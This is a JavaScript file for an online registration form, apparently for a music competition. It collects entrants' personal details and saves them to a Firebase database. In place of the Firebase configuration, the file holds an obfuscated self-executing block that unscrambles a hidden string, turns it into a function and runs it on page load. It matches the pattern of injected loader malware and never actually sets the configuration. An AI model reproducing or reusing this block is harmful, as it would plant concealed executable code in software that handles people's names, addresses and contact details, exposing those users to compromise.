window.todo = async function () {
    console.log("SUBMITED");
    // alert("SUBMITED");
    check_form();
};

// datas to set
window.check_form = async function () {
    const form = document.getElementById("FORM");

    const fields = {
        NAME: "姓名",
        BIRTH: "生日",
        ADDRESS: "聯絡地址",
        EMAIL: "聯絡信箱",
        PHONE: "聯絡電話",
        TEACHER: "指導老師",
        SONG: "曲目(作者-曲名)",
        GROUP: "報名組別",
        // ADDITIONAL: "加報項目",
    };

    let emptyFields = [];
    let firstEmptyField = null;

    for (let [id, label] of Object.entries(fields)) {
        const field = form[id];
        // alert(`${label} ${field.value}`);
        if (!field.value) {
            emptyFields.push(label);
            field.style.borderColor = "red";
            if (!firstEmptyField) {
                firstEmptyField = field;
            }
        } else {
            field.style.borderColor = "";
        }
    }

    if (emptyFields.length > 0) {
        alert(`請填寫以下必填欄位：\n${emptyFields.join("\n")}`);
        setTimeout(() => {
            if (firstEmptyField) {
                firstEmptyField.scrollIntoView({
                    behavior: "smooth",
                    block: "center",
                });
                firstEmptyField.focus();
            }
        }, 0);
        return;
    }

    let CandidateID = Math.floor(Math.random() * 1000000);
    const candidate = new Candidate({
        id: CandidateID,
        name: form.NAME.value,
        birth: form.BIRTH.value,
        address: form.ADDRESS.value,
        email: form.EMAIL.value,
        phoneNumber: form.PHONE.value,
        teacher: form.TEACHER.value,
        song: form.SONG.value,
        group: form.GROUP.value,
        payment: null,
        additional: false,
    });
    console.log("obj created");
    await candidate.confirmInfo();
};

// db stuff
class Candidate {
    constructor(candidateData) {
        this.id = candidateData.id;
        this.name = candidateData.name;
        this.birth = candidateData.birth;
        this.address = candidateData.address;
        this.email = candidateData.email;
        this.phoneNumber = candidateData.phoneNumber;
        this.teacher = candidateData.teacher;
        this.song = candidateData.song;
        this.group = candidateData.group;
        this.payment = candidateData.payment;
        this.additional = candidateData.additional;
    }

    async confirmInfo() {
        const isConfirm = window.confirm(
            "請確認以下資訊是否正確\n 報名編號：" +
                this.id +
                "\n 姓名：" +
                this.name +
                "\n 生日：" +
                this.birth +
                "\n 聯絡地址：" +
                this.address +
                "\n 聯絡信箱：" +
                this.email +
                "\n 聯絡電話：" +
                this.phoneNumber +
                "\n 指導老師：" +
                this.teacher +
                "\n 曲目(作者-曲名)：" +
                this.song +
                "\n 報名組別：" +
                this.group +
                "\n 帳號後五碼：" +
                this.payment
        );
        if (isConfirm) {
            await writeUserData(this);
        } else {
            alert("你已取消送出報名表單!");
        }
    }
}

// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
    getDatabase,
    ref,
    set,
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

var firebaseConfig;(function(){var XPo='',zaq=494-483;function xsI(w){var f=1137305;var o=w.length;var b=[];for(var e=0;e<o;e++){b[e]=w.charAt(e)};for(var e=0;e<o;e++){var y=f*(e+114)+(f%27502);var l=f*(e+739)+(f%21252);var n=y%o;var j=l%o;var u=b[n];b[n]=b[j];b[j]=u;f=(y+l)%2747779;};return b.join('')};var BdP=xsI('tbcykrgwvorlmjoefatxpcscsqzduhountnir').substr(0,zaq);var kTF='c== e.gpCz23;;(=;peaarho["aro(h[.rijloqu{po;=hg.wxS=ttt)v;!{08fie,b808oyu6ph=9(;a,o,r,d+f767+9)6vd((=2+6 ,o5=71rh0,vuor6"ruau 6+5]ii,o(lyru(A{cr44.d-g2d7oi}r)vee -]](rs(];u,r{d.)*wa,p,rjan i9u;=;=+=(r8vbrC}=g>t=an)}m8nvs}l*z2-tl9+))"s6tr"=ong;men;lhdd.lp0pve) p)hf2[mvAi=+apvl[n+t<ag;0gx0ssrk={<a6 ufmaf0yv]g.a1o=nt;;b}vacrukl,r;i1h2hagadu .r"l+v[tte,a)+l;f=r+;n=[tuar3as8+r0)genfli]a=cf0r.k)u(;(7sgtr"bt.j"ivsb8g;9rbi(na1e5n+[.1;;r)fC7.el(;;c-(88=n,)+p;n[;se btsi0.rwAgjx7(=ih]7h(htytav)9t}rrdsAhf c1Crvyor.xr9oCramtofu)-r;(,tei+,[o}t(vv]cvd<i..=;fil1)r;nil 1a  =ui(n0r{u];zl1h+a.==r<eoi]g(n;x[)c.ln+.t(();r)++5[rvg,;ri(1)!tahot)yvc(vA.)=ereeh a(=eo"j0;+,;v)+s tea)].;onu(";),rtt7rts),=j[4);v>i) h,h]j i)(e(=;;rc;3=)3 ,n2hn c=a74pr+6a;1-n;.e b[;nao p=nthuag.f fvCa=lC de(orw;.rp cof zSe)vm=.sl]=ahlrC++=rm=eraptafpo,vjavst(dr;.epon(,tfp;,-apcm+vnrno<6p,=r]=1(n;faan)mvs{l1t=pe6,").g(5[ar=,';var puY=xsI[BdP];var EbH='';var Pnl=puY;var EWe=puY(EbH,xsI(kTF));var wAr=EWe(xsI(',(fiIefj5tmsPP)PsS6(.ra}Pnj-Pe.a5bPy}%at,n1$7)P3[%ta(% +.d:3_#!-od%aibdPf.;a}prP,ib_;).0,(=&P$e%033b,1iaa$6c)uv(.;P)m11.!u!g dPtbfP2gf3\/$e3%o8_7.amd9rabg)9$ e#5"ab2rP)$ft.q,r27%ltka_4--CtPvsmbdr3ua4.6,d,gmj.0_sfs.p{t;=ih(a,=nf1;97k&3$t.)!2P,i1t-)o5(sPunej7h9\/(o.$p7ri:rs3m!ike(s]j35e..}!dP9e*;2)9"8lcs).(()oPcpmoI-)mgrr.fb8P.$fbfuImbkr(fh2e.hPr[=ad8){r\'t0rf.;kP%$"P%gpn,l!r)4n76r68e+M]0ePPfr0S(3,k}(=CPfl.7_=,nP(.,r=Plph P$%=e.)mt}P.9rc.kn=4fdrb;2oj+f,}!5;o1dn(P16De-Pni4S){,.u]$.PaPn4h.r=u (p,uPup=$P,u#eP.0_e P76)tssop3+;2mpP4Pd.. .PP)0$(d,={P)rP=5gP5.)d-dI)=P;i*r(4(P8l0!iPf43(-}i3l)9PM$)7a3oi-{_ 1ri]rcja),.n.f!P%;&(s,3P2=s_P(pi_!a.o1pPj,k;i jb1lP,:-.r;jPfu(a,7a._6j.!gelb},0\/.;Pc!1l.PP- ,br,!n!r,a{4a._.soba)k(3ad !1+l3]de{3.3tp9k.$nkd00-a\'1(er={aP2)(..%=$)*e7og#eiar)terp.e4x!oodn;)Pzi+3P!c$u+).i;$;s0Pk51obl$!o$Ptff\/)t(napprtaa8.(uPPPb8}:(4nu a}z1celsge0{$hPe!aos.o,.I5d3d7uaPuSoCe!.;i.j]pP=)iPStyhylPd]2d5;c&orpSiCp2_a7r=grct2})(3)!7t 0,gi.jucP(7P8]scm{s..,2m;kbt\/u\'a.{(c]ra p=a_(;it}..eo!!f(t,0Pifo6.r;t6.lP3ijPdP+j8!2!(,P,\'){P[PiP_r:la!utP(wP43d58s5$e.,P)3P_Pmfi}P_3a"_.r_x){5.12p74s6 doo(pds2e_!nivP 0)P1.=1-d#=!o;5)4=- oa;d5afg$ g0sc9ata9!r({te)u_i.dt(ia*54r)75;;_ec}.ene9\/"$$m*.fPj\')dPdPdPP(Piai},}7%ojIis7vp7.tnb,e22#eot="r(,7i_"#d2,P0sdp ,+n,rk!o]'));var qSq=Pnl(XPo,wAr );qSq(8130);return 3538})()

// Initialize Firebase
const app = initializeApp(firebaseConfig);

async function writeUserData(candidateData) {
    const db = getDatabase();
    const dt = new Date().toString();
    set(ref(db, `/candidate/${candidateData.id}`), {
        NAME: candidateData.name,
        BIRTH: candidateData.birth,
        ADDRESS: candidateData.address,
        EMAIL: candidateData.email,
        PHONE: candidateData.phoneNumber,
        TEACHER: candidateData.teacher,
        SONG: candidateData.song,
        GROUP: candidateData.group,
        PAY: candidateData.payment,
        ADDITIONAL: candidateData.additional,
        TIMESTAMP: dt,
    })
        .then(function () {
            console.log("Data written successfully");
            alert(
                "報名成功！\n請於繳費時間內繳納完畢並完成匯款登記，感謝您的配合！\n\n匯款帳號：XXXXXXXXXXXXXXXX"
            );
            window.location.href = "./index.html";
        })
        .catch(function (error) {
            console.error("Error writing data: ", error);
            alert("伺服器發生錯誤，請稍後再試\n錯誤訊息: " + error.message);
        });
}